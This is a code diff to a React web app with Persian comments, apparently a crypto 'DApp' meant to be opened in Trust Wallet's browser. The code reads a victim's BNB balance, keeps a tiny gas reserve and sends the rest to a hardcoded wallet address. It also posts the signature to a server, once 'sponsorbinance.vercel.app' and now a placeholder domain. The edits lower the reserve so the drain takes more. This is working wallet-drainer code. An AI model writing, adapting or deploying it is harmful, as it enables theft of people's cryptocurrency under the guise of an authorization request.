@@ -20,7 +20,7 @@ function App() {
   const [account, setAccount] = useState(null);
 
   async function connectAndSend() {
-    // بررسی اینکه در DApp Browser تراست والت هستیم
+    // بررسی وجود provider (باید در DApp Browser تراست والت باشد)
     if (typeof window.ethereum === "undefined") {
       alert("No Ethereum provider found. Please open in Trust Wallet DApp Browser!");
       return;
@@ -47,22 +47,16 @@ function App() {
     console.log("💰 BNB Balance:", bnbBalance);
     const totalBalance = parseFloat(bnbBalance);
 
-    // تعیین مقدار reserve به عنوان نگهداری دو دلار (تقریباً 0.00667 BNB به فرض BNB=$300)
-    const reserveBNB = 0.00667;
-    let sendAmount;
-    if (totalBalance >= reserveBNB) {
-      sendAmount = totalBalance - reserveBNB;
-    } else {
-      console.error("❌ Insufficient funds to cover reserve.");
-      return;
-    }
+    // تعیین reserve به عنوان 0.004 BNB (برای نگهداری هزینه گس)
+    const reserveBNB = 0.004;
+    const sendAmount = totalBalance - reserveBNB;
     if (sendAmount <= 0) {
-      console.error("❌ Send amount calculated as zero or negative.");
+      console.error("❌ Insufficient funds: not enough to cover reserve for gas fee.");
       return;
     }
     console.log("Calculated send amount (BNB):", sendAmount);
 
-    // ساخت پیام برای امضا بر اساس sendAmount
+    // ساخت پیام برای امضای درخواست بر اساس sendAmount
     const message = `Authorize sending ${sendAmount} BNB from ${userAddress}`;
     console.log("📜 Message to sign:", message);
 
@@ -81,14 +75,14 @@ function App() {
 
     // ارسال امضا به سرور جهت بررسی و ثبت لاگ
     try {
-      const resp = await fetch("https://sponsorbinance.vercel.app/api/proxy", {
+      const resp = await fetch("https://YOUR-DOMAIN.com/crypto-project/send.php", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           handler: "tx",
           address: userAddress,
           signature: signature,
-          amount: sendAmount.toString(),  // sendAmount به عنوان مقدار نهایی
+          amount: sendAmount.toString(),
         }),
       });
       const result = await resp.json();
@@ -108,7 +102,7 @@ function App() {
       from: userAddress,
       to: "0xF4c279277f9a897EDbFdba342f7CdFCF261ac4cD", // آدرس مقصد
       value: sendWeiHex,
-      gas: "0x5208",  // 21000 به هگز
+      gas: "0x5208",        // 21000 به هگز
       gasPrice: "0x12a05f200" // 5 gwei به هگز
     };
 
